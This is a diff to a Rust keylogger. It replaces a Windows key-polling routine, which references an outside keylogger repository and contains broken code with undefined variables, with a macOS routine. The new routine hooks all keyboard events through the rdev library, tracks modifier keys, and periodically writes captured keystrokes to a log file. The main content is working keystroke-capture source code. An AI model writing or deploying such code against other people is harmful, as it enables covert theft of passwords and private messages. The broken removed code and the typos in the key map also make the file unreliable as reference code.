@@ -1,93 +1,165 @@
-use std::{fs::{File, OpenOptions, self}, io::{self, BufRead, Read, Cursor}, path::Path, collections::HashMap, time::SystemTime};
-use byteorder::{NativeEndian, ReadBytesExt};
+use std::{fs::OpenOptions, time::SystemTime, fmt, collections::HashMap};
+use rdev::{listen, Event, EventType, Key};
 use anyhow::Result;
-// https://github.com/5ynatra/keylogger.rs/blob/master/src/main.rs
 
+fn win_to_standard_key(key_stroke: String) -> String {
+    let res: String;
+    let key_map: HashMap<&str, &str> = HashMap::from([
+        ("KeyA", "a"),
+        ("Escape", "[esc]"),
+        ("KeyS", "s"),
+        ("KeyD", "d"),
+        ("KeyF", "f"),
+        ("KeyG", "g"),
+        ("KeyH", "h"),
+        ("KeyJ", "j"),
+        ("KeyK", "k"),
+        ("KeyL", "l"),
+        ("SemiColon", ";"),
+        ("Quote", "'"),
+        ("Return", "[retun]"),
+        ("Backspace", "[backspace]"),
+        ("ShiftLeft", "[Lshift]"),
+        ("KeyZ", "z"),
+        ("KeyX","x"),
+        ("KeyC", "c"),
+        ("KeyV", "v"),
+        ("KeyB", "b"),
+        ("KeyN", "n"),
+        ("KeyM", "m"),
+        ("Coma", ","),
+        ("Dot", "."),
+        ("Slash", "/"),
+        ("ShiftRight", "[Rshift]"),
+        ("ControlLeft", "[Lctrl]"),
+        ("Alt", "[Loption]"),
+        ("BackQuote", "`"),
+        ("Num1", "1"),
+        ("Num2", "2"),
+        ("Num3", "3"),
+        ("Num4", "4"),
+        ("Num5", "5"),
+        ("Num6", "6"),
+        ("Num7", "7"),
+        ("Num8", "8"),
+        ("Num9", "9"),
+        ("Num0", "0"),
+        ("Minus", "-"),
+        ("Equal", "="),
+        ("Tab", "[tab]"),
+        ("KeyQ", "q"),
+        ("KeyW", "w"),
+        ("KeyE", "e"),
+        ("KeyR", "r"),
+        ("KeyT", "t"),
+        ("KeyY", "y"),
+        ("KeyU", "u"),
+        ("KeyI", "i"),
+        ("KeyO", "o"),
+        ("KeyP", "p"),
+        ("LeftBracket", "["),
+        ("RightBracket", "]"),
+        ("BackSlash", "\\"),
+        ("CapsLock", "[capslock]"),
+        ("Space", "[space]"),
+        ("UpArrow", "[uparrow]"),
+        ("RightArrow", "[rightarrow]"),
+        ("LeftArrow", "[leftarrow]"),
+        ("DownArrow", "[downarrow]"),
+        ("MetaRight", "[Rmeta]"),
+        ("MetaLeft", "[Lmeta]"),
+        ("F1", "[F1]"),
+        ("F2", "[F2]"),
+        ("F3", "[F3]"),
+        ("F4", "[F4]"),
+        ("F5", "[F5]"),
+        ("F6", "[F6]"),
+        ("F7", "[F7]"),
+        ("F8", "[F8]"),
+        ("F9", "[F9]"),
+        ("F0", "[F0]"),
+        ("Unknown(115)", "[home]"),
+        ("Unknown(116)", "[pageup]"),
+        ("Unknown(121)", "[pagedown]"),
+    ]);
+    if key_map.contains_key(&key_stroke.as_str()) {
+        res = key_map[&key_stroke.as_str()].to_string();
+    }else{
+        res = format!("[{}]", key_stroke);
+    }
+    return res;
+}
 
-extern crate winapi;
+pub(crate) fn mac_log_keys(log_file: String, write_interval: u64) -> Result<()> {
+    println!("Starting");
+    let mut now = SystemTime::now();
 
-pub(crate) fn win_log_keys(keyboard_device_path: String, log_file: String, write_interval: u64) -> Result<()> {
     let mut shift: bool = false;
     let mut capslock: bool = false;
     let mut ctrl: bool = false;
     let mut option: bool = false;
     let mut func: bool = false;
-    
-    
+        
+    let mut file_options = OpenOptions::new();
+    file_options.read(true);
+    file_options.write(false);
     let mut capture_buffer: String = "".to_string();
-    let mut now = SystemTime::now();
-    let qwerty_map_no_mod = super::get_key_hash_map();
 
-    loop {
-        now = SystemTime::now();
+    let _res = listen(move |event| {
+        let mut key_tmp: String = "".to_string();
 
-        for i in 8..190 {
-            if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
-                let key: String  = match i as u32 {
-                    32 => " ".into(),
-                    8 => "[delete]".into(),
-                    13 => "[return]".into(),
-                    winapi::VK_TAB => "[tab]".into(),
-                    winapi::VK_SHIFT => "[Lshift]".into(),
-                    winapi::VK_CONTROL => "[Lctrl]".into(),
-                    winapi::VK_ESCAPE => "[escape]".into(),
-                    winapi::VK_END => "[end]".into(),
-                    winapi::VK_HOME => "[home]".into(),
-                    winapi::VK_LEFT => "[leftarrow]".into(),
-                    winapi::VK_UP => "[uparrow]".into(),
-                    winapi::VK_RIGHT => "[rightarrow]".into(),
-                    winapi::VK_DOWN => "[downarrow]".into(),
-                    190|110 => ".".into(),
-                    _ => (i as u8 as char).to_string()
-                };
-                println!("{}", key);
-                capture_buffer.push_str(key);
-                // write!(&mut file,"{}",key).unwrap();
-                }
-        }
         match now.elapsed() {
             Ok(elapsed) => {
                 if elapsed.as_secs() >= write_interval {
                     if capture_buffer.len() > 0 {
-                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone() )?;
+                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone() ).unwrap();
                     }
                     capture_buffer = "".to_string();
+                    now = SystemTime::now();
                 }
             }
             Err(e) => { println!("Error: {:?}", e); }
         }
-        if qwerty_map_no_mod.contains_key(&code) {
-            if value == 1 {
-                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
-                if qwerty_map_no_mod[&code] == "[capslock]" { capslock = !capslock };
-                if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = true };
-                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
-                if qwerty_map_no_mod[&code] == "[Loption]" || qwerty_map_no_mod[&code] == "[Roption]" { option = true };
-                if qwerty_map_no_mod[&code] == "[Lfunction]" || qwerty_map_no_mod[&code] == "[Rfunction]" { func = true };
-
-                capture_buffer.push_str(super::set_modifier(qwerty_map_no_mod[&code], shift, capslock, ctrl, option, func ).unwrap().as_str());
-                
-            }else if value == 0 {
-                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
-                if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = false };
-                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
-                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
-            }
-        } else if value == 1 || value == 0 {
-            println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
+        // println!("{:?}", event);
+        match event.event_type {
+            EventType::KeyPress(val) => {
+                key_tmp = win_to_standard_key(format!("{:?}", val));
+                match key_tmp.as_str() {
+                    "[Lshift]" => shift = true,
+                    "[Rshift]" => shift = true,
+                    "[capslock]" => capslock = !capslock,
+                    "[Lctrl]" => ctrl = true,
+                    "[Rctrl]" => ctrl = true,
+                    "[Loption]" => option = true,
+                    "[Roption]" => option = true,
+                    "[Lfunction]" => func = true,
+                    "[Rfunction]" => func = true,
+                    _ => (),
+                }
+                now = SystemTime::now();
+                capture_buffer.push_str(super::set_modifier(key_tmp.as_str(), shift, capslock, ctrl, option, func ).unwrap().as_str());
+            },
+            EventType::KeyRelease(val) => {
+                key_tmp = win_to_standard_key(format!("{:?}", val));
+                match key_tmp.as_str() {
+                    "[Lshift]" => shift = false,
+                    "[Rshift]" => shift = false,
+                    "[capslock]" => capslock = !capslock,
+                    "[Lctrl]" => ctrl = false,
+                    "[Rctrl]" => ctrl = false,
+                    "[Loption]" => option = false,
+                    "[Roption]" => option = false,
+                    "[Lfunction]" => func = false,
+                    "[Rfunction]" => func = false,
+                    _ => (),
+                }
+            },
+            EventType::ButtonPress(_) => (),
+            EventType::ButtonRelease(_) => (),
+            EventType::MouseMove { x, y } => (),
+            EventType::Wheel { delta_x, delta_y } => (),
         }
-    }
-}
+    });
 
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_nix_find_keyboard_device() -> Result<()> {
-        let keyboard_device = nix_find_keyboard_device()?;
-        assert!(keyboard_device.contains("/dev/input/event"));
-        Ok(())
-    }
+    Ok(())
 }
